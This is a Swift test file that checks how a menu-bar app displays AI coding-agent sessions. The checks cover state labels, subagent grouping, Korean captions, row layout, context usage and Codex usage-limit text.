import Foundation

func runSessionPresentationChecks() -> [String] {
    var failures: [String] = []
    var checks = 0
    func check(_ passed: @autoclosure () -> Bool, _ name: String) {
        checks += 1
        if !passed() { failures.append("Session presentation: \(name)") }
    }
    // 1_000_003 s: the newest 5 s bucket starts at 1_000_000.
    let now = Date(timeIntervalSince1970: 1_000_003)
    func at(_ offset: TimeInterval) -> Date { now.addingTimeInterval(offset) }
    var utc = Calendar(identifier: .gregorian)
    utc.timeZone = TimeZone(identifier: "UTC")!
    func reading(_ id: String, _ source: TokenSource = .claude, session: String? = nil, agent: String? = nil,
                 project: String? = nil, subagent: Bool = false, parent: String? = nil, active: Bool = false,
                 state: TokenActivityState = .idle, last: TimeInterval = -60) -> TokenReading {
        var value = TokenReading(source: source, id: id, sessionID: session, agentID: agent, project: project,
                                 isSubagent: subagent, active: active, lastActivity: at(last), activityState: state)
        value.parentSessionID = parent
        return value
    }
    func make(_ tokens: [TokenReading], expanded: Bool = false, flow: FlowSeries = .empty) -> SessionListModel {
        SessionListModel.make(tokens: tokens, now: now, expanded: expanded, flow: flow, calendar: utc)
    }

    // Display state maps the tracker enum; stale is "로그 대기" only for 10 minutes after the newest record.
    func state(_ value: TokenReading) -> SessionDisplayState { SessionPresentation.displayState(value, now: now) }
    var output = reading("o", active: true, state: .output)
    output.lastOutputAt = at(-4)
    output.lastOutputDelta = 30
    var future = output
    future.lastOutputAt = at(4)
    var old = output
    old.lastOutputAt = at(-6)
    var tooFuture = output
    tooFuture.lastOutputAt = at(6)
    var loggedLater = reading("s3", state: .stale, last: -900)
    loggedLater.lastLogAt = at(-300)
    check(state(reading("s", state: .stale, last: -540)) == .waiting && state(reading("s2", state: .stale, last: -1_500)) == .waiting
          && state(loggedLater) == .waiting, "stale maps to waiting; the tracker decides when it becomes unfinished")
    check(state(reading("u", state: .unfinished, last: -60)) == .unfinished, "unfinished maps to unfinished")
    check(state(reading("c", state: .complete)) == .complete && state(reading("i", state: .interrupted)) == .interrupted
          && state(reading("n")) == .idle && SessionDisplayState.idle.title == "최근 활동 없음", "inactive complete, interrupted and idle")
    check(state(reading("t", active: true, state: .tool)) == .tool, "open tool turn")
    check(state(output) == .working && state(future) == .working && state(old) == .working && state(tooFuture) == .working,
          "output is an event: a fresh record never changes the display state")
    check(SessionDisplayState.liveOrder == [.input, .retrying, .tool, .working, .waiting]
          && !SessionDisplayState.allCases.map(\.rawValue).contains("output"),
          "one urgency order, input > retry > tool > working > waiting, with no output state")
    check(state(reading("telemetry:codex:model", .codex)) == .measurement, "telemetry rows are measurements")
    check(!SessionDisplayState.waiting.isRunning && SessionDisplayState.waiting.isLive && !SessionDisplayState.unfinished.isLive
          && SessionDisplayState.input.isRunning && SessionDisplayState.retrying.isRunning,
          "waiting is live but not running; unfinished is neither; input and retry are running")

    let alphaRunning = reading("claude:run", session: "RUN", project: "Alpha", active: true, state: .working, last: -2)
    // Input: a pending question or plan approval, shown even when the turn is no longer marked active.
    var question = reading("claude:q", session: "Q", project: "zeta", state: .input, last: -192)
    question.toolCategory = .question
    question.toolName = "AskUserQuestion"
    var plan = question
    plan.toolName = "ExitPlanMode"
    check(state(question) == .input && SessionPresentation.inputTitle(question) == "질문 답변 대기"
          && SessionPresentation.inputTitle(plan) == "계획 승인 대기", "input state and its kind")
    check(SessionDisplayState.input.color != SessionDisplayState.waiting.color && SessionDisplayState.input.title == "입력 필요",
          "input has its own colour and title")

    // API retry: counts and delays only, for 10 minutes after the record.
    var retrying = reading("claude:r", session: "R", project: "beta", active: true, state: .working, last: -3)
    retrying.retry = TokenRetryState(attempt: 2, maxAttempts: 10, retryAt: at(4), networkDown: false, at: at(-3))
    var oldRetry = retrying
    oldRetry.retry?.at = at(-700)
    check(state(retrying) == .retrying && state(oldRetry) == .working, "a recent retry shows; an old one falls back")
    check(SessionPresentation.retryText(retrying.retry!, now: now) == "재시도 2/10 · 4초 후"
          && SessionPresentation.retryText(TokenRetryState(attempt: 7, maxAttempts: 10, retryAt: at(20), networkDown: true, at: now), now: now)
            == "재시도 7/10 · 네트워크 끊김"
          && SessionPresentation.retryText(TokenRetryState(attempt: 3, maxAttempts: nil, retryAt: nil, networkDown: false, at: now), now: now)
            == "재시도 3회째 · 재요청 중", "retry copy")

    // Tool categories replace the generic chip text; raw names never appear in it.
    var command = reading("codex:cmd", .codex, session: "C", project: "alpha", active: true, state: .tool, last: -40)
    command.toolCategory = .command
    command.toolName = "exec"
    check(SessionPresentation.stateTitle(.tool, command) == "명령 실행"
          && SessionPresentation.stateTitle(.tool, reading("x", active: true, state: .tool)) == "도구 실행"
          && SessionPresentation.toolTitle(.agent) == "하위 에이전트 대기" && SessionPresentation.toolTitle(.mcp) == "MCP 도구",
          "tool category titles")

    // Grouping is by exact (source, session) identity.
    let claudeParent = reading("claude:p", session: "S1", project: "TokenCat", active: true, state: .working, last: -2)
    let claudeChild = reading("claude:p/agent-b", session: "S1", agent: "b1234567890", project: "TokenCat", subagent: true,
                              active: true, state: .tool, last: -1)
    let codexParent = reading("codex:root", .codex, session: "R1", project: "TokenCat", state: .complete, last: -30)
    let codexChild = reading("codex:child", .codex, session: "C1", agent: "/root/sample_runner", project: "sample-chat",
                             subagent: true, parent: "R1", active: true, state: .working, last: -3)
    let orphan = reading("claude:orphan", session: "S9", agent: "a9", project: "Elsewhere", subagent: true,
                         state: .complete, last: -400)
    let crossSource = reading("codex:cross", .codex, session: "S1", agent: "x", subagent: true, state: .complete, last: -500)
    let telemetry = reading("telemetry:claude:S1", session: "S1", state: .complete, last: -10)
    let groups = SessionPresentation.groups([orphan, codexChild, claudeChild, telemetry, crossSource, codexParent, claudeParent], now: now)
    func group(_ id: String) -> SessionGroup? { groups.first { $0.id == id } }
    check(group("claude:p")?.children.map(\.reading.id) == ["claude:p/agent-b"], "Claude agent folds under its session")
    check(group("codex:root")?.children.map(\.reading.id) == ["codex:child"], "Codex child folds by parentSessionID")
    check(group("claude:orphan")?.isOrphan == true && group("codex:cross") != nil, "orphans and other-source children stay top-level")
    check(group("telemetry:claude:S1")?.children.isEmpty == true && groups.count == 5, "telemetry never groups")
    check(group("codex:root")?.state == .working && group("claude:p")?.state == .tool, "group state follows its most active member")
    check(SessionPresentation.agentLabel(codexChild) == "sample_runner" && SessionPresentation.agentLabel(claudeChild) == "b1234567",
          "agent labels")
    check(SessionPresentation.childProjectSuffix(codexChild, parent: codexParent) == "sample-chat"
          && SessionPresentation.childProjectSuffix(claudeChild, parent: claudeParent) == nil, "child shows a differing project")
    var modelled = claudeParent
    modelled.model = "claude-opus-5-5"
    modelled.effort = "XHigh"
    check(SessionPresentation.shortID(codexParent) == "R1" && SessionPresentation.shortID(orphan) == "a9"
          && SessionPresentation.clientLine(modelled) == "Claude Code · claude-opus-5-5 · xhigh"
          && SessionPresentation.clientLine(codexParent) == "Codex · 모델 기록 대기", "short identity and the one-text client line")
    check(SessionPresentation.spokenLabel(modelled, state: .input) == "입력 필요, TokenCat, Claude Code claude-opus-5-5"
          && SessionPresentation.spokenLabel(codexChild, state: .working) == "하위 에이전트 sample_runner, 진행", "VoiceOver row labels")
    var roleChild = claudeChild
    roleChild.agentRole = "Explore"
    var reviewChild = codexChild
    reviewChild.agentRole = "guardian"
    check(SessionPresentation.childTitle(roleChild) == ("Explore", "b1234567") && SessionPresentation.childTitle(claudeChild) == ("b1234567", nil)
          && SessionPresentation.childTitle(reviewChild) == ("sample_runner", "자동 검토"), "subagent role labels keep the ID")
    var workflowChild = claudeChild
    workflowChild.agentID = "a1111111e1"
    workflowChild.agentRole = "workflow-subagent"
    var generalChild = workflowChild
    generalChild.agentRole = " general-purpose "
    check(SessionPresentation.childTitle(workflowChild) == ("a1111111", nil) && SessionPresentation.childTitle(generalChild) == ("a1111111", nil)
          && SessionPresentation.roleLabel(workflowChild.agentRole) == "workflow-subagent"
          && SessionPresentation.roleLabel(reviewChild.agentRole) == "자동 검토" && SessionPresentation.roleLabel("  ") == nil,
          "shared roles leave the ID as the title; help keeps the role")
    let counts = SessionCounts(groups)
    check(counts.runningGroups == 2 && counts.tool == 1 && counts.working == 1 && counts.runningSubagents == 2
          && counts.phase == .tool && counts.readings == 7 && counts.toolMembers == 1 && counts.toolCategories[.other] == 1,
          "counts are per group")
    var outputChild = reading("claude:p/agent-o", session: "S1", agent: "o1", subagent: true, active: true, state: .output, last: -1)
    outputChild.lastOutputAt = at(-1)
    outputChild.lastOutputDelta = 12
    let mixedCounts = SessionCounts(SessionPresentation.groups([claudeParent, claudeChild, outputChild], now: now))
    check(mixedCounts.tool == 1 && mixedCounts.working == 0 && mixedCounts.toolMembers == 1 && mixedCounts.phase == .tool,
          "a fresh record never hides a running tool in the group or the menu-bar phase")
    var inputChild = reading("claude:p/agent-q", session: "S1", agent: "q1", subagent: true, state: .input, last: -5)
    inputChild.toolCategory = .question
    let inputCounts = SessionCounts(SessionPresentation.groups([claudeParent, claudeChild, inputChild, retrying], now: now))
    check(inputCounts.input == 1 && inputCounts.tool == 0 && inputCounts.retrying == 1 && inputCounts.runningGroups == 2
          && inputCounts.phase == .input && inputCounts.retry?.attempt == 2, "input outranks tool for the group and the menu-bar phase")
    check(SessionPresentation.childGroupText(.input, count: 1) == "하위 1개 입력 필요"
          && SessionPresentation.childGroupText(.retrying, count: 2) == "하위 2개 API 재시도"
          && SessionPresentation.childGroupText(.tool, count: 3) == "하위 3개 진행 중"
          && SessionPresentation.childGroupText(.waiting, count: 4) == "하위 4개 로그 대기", "an idle lead names its children's state")
    check(SessionCounts(SessionPresentation.groups([retrying], now: now)).phase == .working, "a retry alone keeps the neutral phase")
    // Group state and menu-bar phase share one order: a retry outranks a tool in both.
    var retryingChild = reading("claude:p/agent-r", session: "S1", agent: "r1", subagent: true, active: true, state: .working, last: -1)
    retryingChild.retry = TokenRetryState(attempt: 1, maxAttempts: 10, retryAt: at(5), networkDown: false, at: at(-1))
    let retryGroups = SessionPresentation.groups([claudeParent, claudeChild, retryingChild], now: now)
    let retryCounts = SessionCounts(retryGroups)
    check(retryGroups.first?.state == .retrying && retryCounts.retrying == 1 && retryCounts.tool == 0
          && retryCounts.phase == SessionCounts.phase(.retrying) && retryCounts.phase == .working,
          "group state and menu-bar phase follow the same order")

    // The flow-card caption: input > retry > tool category > progress > waiting, only after 30 s without a record.
    func caption(_ counts: SessionCounts, _ last: TimeInterval?) -> FlowCaption {
        SessionPresentation.flowCaption(counts: counts, last: last.map(at), now: now)
    }
    var noticeCounts = SessionCounts(SessionPresentation.groups([command, reading("claude:w", session: "W", state: .stale, last: -200)], now: now))
    check(caption(noticeCounts, -40).text == "명령 실행 중 · 응답 후 기록" && !caption(noticeCounts, -40).emphasized
          && caption(noticeCounts, -10).text == "마지막 기록" && caption(noticeCounts, -10).glyph == nil, "tool category caption after 30 s")
    noticeCounts.tool = 0
    check(caption(noticeCounts, nil).text == "로그 대기 · 3분째 기록 없음", "waiting caption")
    let urgent = SessionCounts(SessionPresentation.groups([command, retrying, question], now: now))
    let retryOnly = SessionCounts(SessionPresentation.groups([command, retrying], now: now))
    check(caption(urgent, -2).text == "마지막 기록" && caption(urgent, -40).text == "입력 대기 · 답변하면 계속 기록"
          && caption(urgent, -40).glyph == .input && caption(urgent, -40).emphasized
          && caption(retryOnly, -40).text == "API 재시도 2/10 · 4초 후" && caption(retryOnly, -40).glyph == .retry,
          "input and retry captions follow the same 30 s rule and are emphasized")
    var offlineCounts = retryOnly
    offlineCounts.retry?.networkDown = true
    check(caption(offlineCounts, nil).text == "API 재시도 · 네트워크 끊김"
          && caption(SessionCounts(), nil).text == "마지막 기록", "network-down retry; nothing live keeps the default")
    var plan2 = plan
    plan2.id = "claude:q2"
    plan2.sessionID = "Q2"
    var question3 = question
    question3.id = "claude:q3"
    question3.sessionID = "Q3"
    let plans = SessionCounts(SessionPresentation.groups([plan, plan2, command], now: now))
    let mixedInput = SessionCounts(SessionPresentation.groups([plan, question3], now: now))
    check(plans.inputPlansOnly && caption(plans, nil).text == "계획 승인 대기 · 승인하면 계속 기록"
          && !mixedInput.inputPlansOnly && caption(mixedInput, nil).text == "입력 대기 · 답변하면 계속 기록",
          "plan approvals say 승인; a mix keeps the general copy")

    // Header sentence (H-2) and head echo (H-3): one sentence per top state.
    func header(_ counts: SessionCounts, loading: Bool = false, spoken: Bool = false) -> HeaderStatus {
        SessionPresentation.headerStatus(counts: counts, loading: loading, now: now, spoken: spoken)
    }
    let loadingHeader = header(SessionCounts(), loading: true)
    check(loadingHeader.sentence == "기록 확인 중" && loadingHeader.muted && loadingHeader.suffix.isEmpty && loadingHeader.glyph == nil,
          "loading header")
    check(header(urgent).spoken == "입력 필요 1개 · 진행 2개" && header(urgent).glyph == .input && header(urgent).head == .alert
          && header(plans).spoken == "계획 승인 대기 2개 · 진행 1개"
          && header(SessionCounts(SessionPresentation.groups([question], now: now))).spoken == "입력 필요 1개 · 답변하면 계속됩니다"
          && header(urgent).help.contains("권한 확인 요청은 로그에 남지 않아"), "input header")
    check(header(retryOnly).spoken == "API 재시도 1개 · 재시도 2/10 · 4초 후" && header(retryOnly).glyph == .retry, "retry header")
    let toolHeader = header(SessionCounts(SessionPresentation.groups([claudeParent, claudeChild, codexParent, codexChild], now: now)))
    check(toolHeader.spoken == "세션 2개 진행 중 · 도구 실행 1 · 하위 2" && toolHeader.glyph == .tool && toolHeader.head == .normal
          && header(SessionCounts(SessionPresentation.groups([alphaRunning], now: now))).spoken == "세션 1개 진행 중"
          && header(SessionCounts(SessionPresentation.groups([alphaRunning], now: now))).glyph == .working, "tool and progress header")
    check(header(noticeCounts).spoken == "로그 대기 1개 · 3분째 새 기록 없음" && header(noticeCounts).glyph == .waiting, "log-wait header")
    let restHeader = header(SessionCounts(SessionPresentation.groups([reading("claude:old", session: "O", state: .complete, last: -7_300)], now: now)))
    let recentHeader = header(SessionCounts(SessionPresentation.groups([reading("claude:new", session: "N", state: .complete, last: -120)], now: now)))
    check(restHeader.spoken == "진행 중인 세션 없음 · 마지막 활동 2시간 전" && restHeader.glyph == nil && restHeader.head == .sleep
          && recentHeader.head == .normal && header(SessionCounts()).spoken == "진행 중인 세션 없음" && header(SessionCounts()).head == .sleep,
          "no live session: last activity, and the head sleeps after 10 minutes")
    let oldCounts = SessionCounts(SessionPresentation.groups([reading("claude:old", session: "O", state: .complete, last: -7_300)], now: now))
    check(SessionPresentation.headerStatus(counts: oldCounts, loading: false, now: now, quietSince: now.addingTimeInterval(-300)).head == .normal
          && SessionPresentation.headerStatus(counts: oldCounts, loading: false, now: now, quietSince: now.addingTimeInterval(-700)).head == .sleep,
          "the header head sleeps on the menu-bar cat's quiet reference, not only the last log record")

    // Stable ordering: input first, then running groups by project and session, unaffected by activity time.
    let beta = reading("claude:beta", session: "B", project: "beta", active: true, state: .working, last: -1)
    var alpha = reading("claude:alpha", session: "A", project: "Alpha", active: true, state: .working, last: -50)
    let waiting = reading("claude:wait", session: "W", project: "aaa", state: .stale, last: -200)
    let idle = (0..<8).map { reading("claude:idle\($0)", session: "I\($0)", project: "idle", state: .complete, last: Double(-100 - $0)) }
    var measured = reading("telemetry:codex:model:gpt", .codex, state: .complete, last: -10)
    var measurement = TokenSpeedMeasurement(TelemetryReading(provider: .codex, at: at(-10)))
    measurement.outputTokens = 100
    measurement.requestDurationMs = 1_000
    measured.speedMeasurement = measurement
    var input = [beta, alpha, waiting, measured] + idle
    let first = make(input)
    alpha.lastActivity = at(0)
    input[1] = alpha
    let second = make(input)
    let expectedOrder = ["claude:alpha", "claude:beta", "claude:wait", "telemetry:codex:model:gpt", "claude:idle0", "claude:idle1"]
    check(first.blocks.map(\.id) == expectedOrder && second.blocks.map(\.id) == expectedOrder,
          "running, waiting, measured, then recent idle; stable when activity changes")
    check(make(input + [question]).blocks.first?.id == "claude:q", "a turn waiting for input goes first")
    check(first.hiddenGroups == 6 && first.hiddenChildren == 0 && first.counts.groups == 12, "collapsed list fills to six rows")
    check(first.contentHeight == 44 * 3 + 28 * 3 + 5, "quiet live rows fold to 44pt; heights stay deterministic")
    // Line 3 holds the current turn's last record, context or a measured speed; anything else stays at 44 pt.
    var flowing = alpha
    flowing.currentTurnStartedAt = at(-60)
    flowing.lastOutputAt = at(-20)
    flowing.lastOutputDelta = 40
    var earlierTurn = flowing
    earlierTurn.currentTurnStartedAt = at(-10)
    var withContext = beta
    withContext.context = TokenContextUsage(usedTokens: 1_000, windowTokens: nil, recordedAt: at(-1))
    var withSpeed = beta
    withSpeed.speedMeasurement = measurement
    check(make([flowing]).blocks.first?.lead.height == 58 && make([withContext]).blocks.first?.lead.height == 58
          && make([withSpeed]).blocks.first?.lead.height == 58 && make([earlierTurn]).blocks.first?.lead.height == 44
          && SessionPresentation.lastRecord(flowing)?.tokens == 40 && SessionPresentation.lastRecord(earlierTurn) == nil,
          "a record, context or measured speed keeps the third line; an earlier turn's record does not")
    check(SessionRowItem(reading: beta, state: .working, kind: .live, showsDetail: false).height == 44
          && SessionRowItem(reading: beta, state: .complete, kind: .idle).height == 28
          && SessionRowItem(reading: claudeChild, state: .tool, kind: .child).height == 24
          && SessionListModel.moreHeight == 24 && SessionListModel.captionHeight == 24 && SessionListModel.olderHeight == 28
          && SessionListModel.dividerHeight == 1, "row heights on the 4 pt grid")
    // Speed column (S-3): only when a visible live lead row has a measurement; child rows have no speed cell.
    var restingSpeed = withSpeed
    restingSpeed.active = false
    restingSpeed.activityState = .complete
    var measuredChild = claudeChild
    measuredChild.speedMeasurement = measurement
    check(!make([beta, alpha]).showsSpeedColumn && make([beta, withSpeed]).showsSpeedColumn
          && !make([restingSpeed]).showsSpeedColumn && !make([claudeParent, measuredChild]).showsSpeedColumn
          && !make([claudeParent, measuredChild], expanded: true).showsSpeedColumn,
          "speed column follows visible live lead measurements")
    // The column never adds a third line of its own, and a client waiting for a restart opens none.
    let column = make([alpha, withSpeed])
    let restarting = SessionListModel.make(tokens: [withSpeed], now: now, expanded: false, restart: [.claude], calendar: utc)
    check(column.showsSpeedColumn && column.item(alpha.id)?.height == 44 && column.item(withSpeed.id)?.height == 58
          && !restarting.showsSpeedColumn && restarting.blocks.first?.lead.height == 44,
          "a row without a record, context or speed stays at 44 pt beside a speed column; a restart-waiting measurement opens nothing")
    // "—" only where a speed is expected: working, tool and API retry rows; input and log-wait rows show a measured value or nothing.
    func cell(_ reading: TokenReading, _ state: SessionDisplayState, column: Bool = true, restart: Set<TokenSource> = []) -> String? {
        SessionPresentation.speedCell(reading, state: state, now: now, showsColumn: column, restart: restart)?.value
    }
    var measuredInput = question
    measuredInput.speedMeasurement = measurement
    check(cell(alpha, .working) == "—" && cell(alpha, .tool) == "—" && cell(retrying, .retrying) == "—"
          && cell(question, .input) == nil && cell(waiting, .waiting) == nil && cell(measuredInput, .input) == "100.0"
          && cell(alpha, .working, column: false) == nil && cell(withSpeed, .working, restart: [.claude]) == nil,
          "the speed cell shows a dash only where a speed is expected")
    // Short IDs only where two visible rows share a project.
    var twin = beta
    twin.id = "claude:beta2"
    twin.sessionID = "B2"
    check(make([beta, twin, alpha]).sharedProjects(showOlder: false) == ["beta"] && make([beta, alpha]).sharedProjects(showOlder: false).isEmpty,
          "shared projects")
    let expanded = make(input, expanded: true)
    check(expanded.blocks.count == 12 && expanded.hiddenGroups == 0 && expanded.hiddenChildren == 0, "expanded shows every group")
    let family = make([codexParent, codexChild, reading("codex:done", .codex, session: "C2", agent: "/root/done",
                                                         subagent: true, parent: "R1", state: .complete, last: -20)])
    check(family.blocks.first?.lead.kind == .idle && family.blocks.first?.children.map(\.id) == ["codex:child"]
          && family.blocks.first?.childCount == 2 && family.hiddenGroups == 0 && family.hiddenChildren == 1,
          "collapsed groups show only live children")
    // While a child runs, children waiting for a log stay in the summary row only.
    let floodParent = reading("claude:S1", session: "S1", project: "TokenCat", state: .complete, last: -600)
    let flood = (0..<9).map { reading("claude:S1/a\($0)", session: "S1", agent: "a0\($0)xxxxx", subagent: true, state: .stale, last: -100) }
        + [reading("claude:S1/z", session: "S1", agent: "zz-tool", subagent: true, active: true, state: .tool, last: -1)]
    let floodCollapsed = make([floodParent] + flood)
    let floodBlock = floodCollapsed.blocks.first
    check(floodBlock?.children.map(\.id) == ["claude:S1/z"] && floodBlock?.state == .tool
          && floodBlock?.runningChildren == 1 && floodBlock?.waitingChildren == 9,
          "waiting children take no slot while a child runs")
    check(floodBlock?.moreCount == 9 && floodBlock?.moreText == "+9 하위 로그 대기 · 마지막 1분 전"
          && floodCollapsed.hiddenGroups == 0 && floodCollapsed.hiddenChildren == 9
          && floodCollapsed.contentHeight == 28 + 24 + 24, "cut children are summarised with their newest record")
    let quietBlock = make([floodParent] + flood.dropLast()).blocks.first
    check(quietBlock?.children.map(\.id) == ["claude:S1/a0", "claude:S1/a1", "claude:S1/a2"] && quietBlock?.moreCount == 6,
          "with nothing running, up to three waiting children show")
    let busy = (0..<4).map { reading("claude:S1/r\($0)", session: "S1", agent: "r0\($0)xxxxx", subagent: true, active: true,
                                     state: $0 == 3 ? .tool : .working, last: -1) }
    let busyBlock = make([floodParent] + busy + flood.dropLast()).blocks.first
    check(busyBlock?.children.map(\.id) == busy.map(\.id) && busyBlock?.moreCount == 9,
          "running children are never cut by the collapsed cap")
    let floodExpanded = make([floodParent] + flood, expanded: true)
    check(floodExpanded.blocks.first?.children.count == 10 && floodExpanded.blocks.first?.moreCount == 0
          && floodExpanded.blocks.first?.children.first?.id == "claude:S1/z", "expanded shows every child, running first")

    // Expanded date captions come from the model clock; "이전" folds behind one row.
    let day: TimeInterval = 86_400
    // 1_000_003 s is Monday 1970-01-12 13:46:43 UTC.
    check(SessionPresentation.daySection(at(-600), now: now, calendar: utc) == "오늘"
          && SessionPresentation.daySection(at(-day), now: now, calendar: utc) == "어제"
          && SessionPresentation.daySection(at(-3 * day), now: now, calendar: utc) == "이전"
          && SessionPresentation.daySection(at(30), now: now, calendar: utc) == "오늘", "day sections")
    var weekCalendar = utc
    weekCalendar.firstWeekday = 2
    let thursday = Date(timeIntervalSince1970: 1_000_003 + 3 * day)
    check(SessionPresentation.daySection(thursday.addingTimeInterval(-3 * day), now: thursday, calendar: weekCalendar) == "이번 주"
          && SessionPresentation.daySection(thursday.addingTimeInterval(-4 * day), now: thursday, calendar: weekCalendar) == "이전",
          "this week follows the calendar week")
    let dated = [reading("claude:d0", session: "D0", state: .complete, last: -600), reading("claude:d1", session: "D1", state: .complete, last: -day),
                 reading("claude:d2", session: "D2", state: .complete, last: -5 * day), reading("claude:d3", session: "D3", state: .complete, last: -9 * day)]
    let datedList = make([beta] + dated, expanded: true)
    let datedIDs = ["claude:beta", "caption:claude:d0", "claude:d0", "caption:claude:d1", "claude:d1", "divider:older", "older"]
    // beta 44 + (caption 24 + row 28) × 2 + divider 1 + older 28; open: + (caption 24 + row 28 + divider 1 + row 28) instead of the fold.
    let foldedHeight: CGFloat = 44 + 52 + 52 + 1 + 28, openHeight: CGFloat = 44 + 52 + 52 + 24 + 28 + 1 + 28
    func rules(_ list: SessionListModel) -> [Bool] {
        list.entries(showOlder: true).compactMap { entry -> Bool? in if case .caption(_, let rule, _) = entry { return rule } else { return nil } }
    }
    check(datedList.blocks.map(\.section) == [nil, "오늘", "어제", "이전", "이전"] && datedList.olderCount == 2
          && datedList.entries(showOlder: false).map(\.id) == datedIDs && rules(datedList) == [true, true, true]
          && rules(make(dated, expanded: true)) == [false, true, true]
          && datedList.contentHeight == foldedHeight && datedList.olderContentHeight == openHeight,
          "captions, a rule above all but a caption at the top, folded older section and both heights")
    // A frozen order can place two runs of the same section; each caption still has its own identity.
    let frozenDated = datedList.reordered(["claude:beta", "claude:d0", "claude:d1", "claude:d2"])
    let frozenIDs = frozenDated.entries(showOlder: true).map { $0.id }
    check(Set(frozenIDs).count == frozenIDs.count, "duplicate list entry IDs")
    // Keyboard navigation skips captions and dividers; selection starts at input, then retry, then the first row.
    check(datedList.navigation(showOlder: false) == ["claude:beta", "claude:d0", "claude:d1", "older"]
          && datedList.navigation(showOlder: true).count == 5
          && make([beta, retrying, question]).startRow(showOlder: false) == "claude:q"
          && make([beta, retrying]).startRow(showOlder: false) == "claude:r" && make([beta, alpha]).startRow(showOlder: false) == "claude:alpha",
          "navigation rows and the first selection")
    let floodNavigation = make([reading("claude:S1", session: "S1", project: "TokenCat", state: .complete, last: -600)]
                               + (0..<5).map { reading("claude:S1/a\($0)", session: "S1", agent: "a0\($0)xxxxx", subagent: true, state: .stale, last: -100) })
    check(floodNavigation.navigation(showOlder: false) == ["claude:S1", "claude:S1/a0", "claude:S1/a1", "claude:S1/a2", "more:claude:S1"],
          "children and the +N row are navigable")
    // Frozen order (S-8): known blocks keep their place, new ones go to the end, heights follow.
    let frozen = make([beta, alpha, waiting]).reordered(["claude:wait", "claude:beta"])
    check(frozen.blocks.map(\.id) == ["claude:wait", "claude:beta", "claude:alpha"] && frozen.contentHeight == make([beta, alpha, waiting]).contentHeight,
          "a frozen order appends new blocks")

    // The viewport cut lands at least 12pt inside a row and hides at least 6pt of it.
    let long = make((0..<12).map { reading("claude:L\($0)", session: "L\($0)", active: true, state: .working, last: -1) })
    let cut = long.viewport(showOlder: false)
    let tops = (0..<12).map { CGFloat($0) * 45 }  // 44 pt rows + 1 pt dividers
    check(long.contentHeight > SessionListModel.maxViewport && cut <= SessionListModel.maxViewport
          && tops.contains { cut - $0 >= 12 && $0 + 44 - cut >= 6 }, "viewport snaps inside a row")
    check(make([beta]).viewport(showOlder: false) == 44, "short lists are not snapped")

    // Context: Codex percentage from the logged window, Claude absolute only.
    var codexContext = command
    codexContext.context = TokenContextUsage(usedTokens: 158_204, windowTokens: 258_400, recordedAt: at(-45))
    var nearlyFull = codexContext
    nearlyFull.context?.usedTokens = 235_100
    var claudeContext = question
    claudeContext.context = TokenContextUsage(usedTokens: 182_331, windowTokens: nil, recordedAt: at(-120), compactedAt: at(-300))
    let codexSlot = SessionPresentation.context(codexContext, now: now)
    let claudeSlot = SessionPresentation.context(claudeContext, now: now)
    check(codexSlot?.text == "컨텍스트 61% 사용" && codexSlot?.short == "61%" && codexSlot?.spoken == "컨텍스트 61퍼센트 사용"
          && codexSlot?.warning == false && SessionPresentation.context(nearlyFull, now: now)?.warning == true
          && claudeSlot?.text == "컨텍스트 182k" && claudeSlot?.short == "182k" && claudeSlot?.fraction == nil
          && claudeSlot?.help.contains("압축 완료 기록 5분 전") == true
          && SessionPresentation.context(command, now: now) == nil, "context slots never infer a window")
    var longAgo = claudeContext
    longAgo.context?.compactedAt = at(-1_900)
    check(claudeSlot?.compacted == "압축 5분 전" && SessionPresentation.context(longAgo, now: now)?.compacted == nil
          && codexSlot?.compacted == nil, "a compaction shows as a fact for 30 minutes")

    // Codex usage limit: newest reset window, highest value inside it, always with its record age.
    var limited = command
    limited.rateLimit = TokenRateLimit(usedPercent: 28, windowMinutes: 10_080, resetsAt: at(5 * day + 11 * 3_600 + 30), recordedAt: at(-720))
    var lower = limited
    lower.rateLimit?.usedPercent = 21
    lower.rateLimit?.recordedAt = at(-60)
    var replayed = limited
    replayed.rateLimit = TokenRateLimit(usedPercent: 95, windowMinutes: 10_080, resetsAt: at(-day), recordedAt: at(-5))
    var claudeLimit = question
    claudeLimit.rateLimit = TokenRateLimit(usedPercent: 99, windowMinutes: 300, resetsAt: at(10 * day), recordedAt: now)
    let usage = SessionPresentation.usageLimit([limited, lower, replayed, claudeLimit])
    check(usage?.usedPercent == 28 && usage?.recordedAt == at(-60) && usage?.title == "Codex 주간 한도" && usage?.value(now: now) == "28% 사용"
          && usage?.detail(now: now) == "5일 11시간 후 초기화 · 1분 전 기록 기준", "usage limit is replay-proof and never Claude")
    let expired = UsageLimitSummary(usedPercent: 64, windowMinutes: 300, resetsAt: at(-10), recordedAt: at(-7_000))
    check(expired.value(now: now) == "—" && expired.detail(now: now) == "초기화됨 · 다음 Codex 기록 대기" && expired.isOld(now: now)
          && SessionPresentation.usageLimit([question]) == nil && SessionPresentation.windowLabel(300) == "5시간"
          && SessionPresentation.windowLabel(2_880) == "2일" && SessionPresentation.countdown(to: at(42 * 60), now: now) == "42분",
          "expired windows, labels and countdowns")
    check(!(usage?.help(now: now).contains("예상") ?? true) && !(usage?.detail(now: now).contains("소진") ?? true)
          && usage?.help(now: now).contains("Claude") == false, "no forecast in limit copy, and no claim that Claude limits are missing")
    check(usage?.details(now: now) == ["5일 11시간 후 초기화 · 1분 전 기록", "5일 11시간 후 초기화"] && usage?.percentText == "28"
          && expired.details(now: now) == ["초기화됨 · 다음 Codex 기록 대기"], "limit row variants keep the countdown whole")
    // Old Codex logs carry no reset time: different weeks cannot be told apart, so only the newest record counts.
    var undatedOld = command
    undatedOld.rateLimit = TokenRateLimit(usedPercent: 97, windowMinutes: 10_080, resetsAt: nil, recordedAt: at(-3 * day))
    var undatedNew = command
    undatedNew.rateLimit = TokenRateLimit(usedPercent: 12, windowMinutes: 10_080, resetsAt: nil, recordedAt: at(-600))
    let undated = SessionPresentation.usageLimit([undatedOld, undatedNew])
    check(undated?.usedPercent == 12 && undated?.recordedAt == at(-600) && undated?.resetsAt == nil
          && undated?.detail(now: now) == "10분 전 기록 기준" && undated?.isShown(now: now) == true,
          "without reset times the newest record wins, not the highest")
    let staleUndated = UsageLimitSummary(usedPercent: 40, windowMinutes: 300, resetsAt: nil, recordedAt: at(-6 * 3_600))
    check(staleUndated.expired(now: now) && staleUndated.value(now: now) == "—" && staleUndated.isShown(now: now)
          && !UsageLimitSummary(usedPercent: 40, windowMinutes: 300, resetsAt: nil, recordedAt: at(-2 * day)).isShown(now: now),
          "an undated record expires one window after it was written")
    // A reset window says "초기화됨" for one day, then the card goes away.
